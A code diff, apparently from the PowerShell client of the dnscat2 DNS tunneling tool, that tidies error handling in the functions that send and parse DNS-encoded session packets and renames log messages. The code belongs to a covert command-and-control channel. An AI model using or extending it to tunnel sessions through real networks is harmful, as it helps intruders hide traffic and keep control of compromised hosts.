@@ -93,26 +93,19 @@ function Send-Dnscat2Packet ($Packet, $Domain, $DNSServer, $DNSPort, $LookupType
     if ($LookupType -eq "TXT") {
         if ($result.Contains('"')) {
             return ([regex]::Match($result.replace("bio=",""),'(?<=")[^"]*(?=")').Value)
-        } else {
-            return 1
         }
     } elseif ($LookupType -eq "MX") {
         if ($result.Contains('mail')) {
             $result = ([string](($result[($result.IndexOf("mail exchanger = ") + 17)..$result.Length] -join '').split("`n")[0])).replace($Domain,"").replace(".","").replace("`n","").replace(" ","").Trim()
             return $result
-        } else {
-            return 1
         }
     } elseif ($LookupType -eq "CNAME") {
         if ($result.Contains('canonical')) {
             $result = ([string](($result[($result.IndexOf("canonical name =") + 17)..$result.Length] -join '').split("`n")[0])).replace($Domain,"").replace(".","").replace("`n","").replace(" ","").Trim()
             return $result
-        } else {
-            return 1
         }
-    } else {
-        return 1
     }
+    return 1
 }
 
 function ConvertTo-Dnscat2Packet ($RawPacket) {
@@ -554,24 +547,20 @@ function Update-Dnscat2Session ($Session) {
         # Retrive Driver Data
         $Session = Read-DataFromDriver $Session
         
-        if ($Session.Dead) {
-            $Session = Stop-Dnscat2Session $Session
-            return $Session
-        }
-        
         # Grab next data in the queue
         $PacketData = (Get-NextDnscat2Data $Session["DriverDataQueue"] $Session["MaxMSGDataSize"])
         
         try {
             $Packet = (Send-Dnscat2Packet (New-Dnscat2MSG $Session["Domain"] $Session["SessionId"] $Session["SequenceNumber"] $Session["AcknowledgementNumber"] $PacketData) $Session["Domain"] $Session["DNSServer"] $Session["DNSPort"] $Session["LookupTypes"])
         } catch {
-            Write-Host "HOST: Failed to send packet."
+            Write-Host "Dnscat2: Failed to send packet! "
 			$Session.Dead = $True
+            return $Session
         }
         
         try {
             $Packet = (ConvertTo-Dnscat2Packet $Packet)
-            if($Packet -eq 1){ Write-Host "HOST: Failed to ConvertTo-Dnscat2Packet..."; $Session.Dead = $True }
+            if($Packet -eq 1){ Write-Host "Dnscat2: Failed to ConvertTo-Dnscat2Packet..."; $Session.Dead = $True }
             
             if ($Packet["MessageType"] -eq "01") {
                 # Check if server ACKed sent data
@@ -592,7 +581,7 @@ function Update-Dnscat2Session ($Session) {
                 return $Session
             }
         } catch {
-            Write-Host "HOST: Caught error while processing packet, dropping..."
+            Write-Host "Dnscat2: Caught error while processing packet, dropping..."
 			$Session.Dead = $True 
 			$Session = Stop-Dnscat2Session $Session
         }
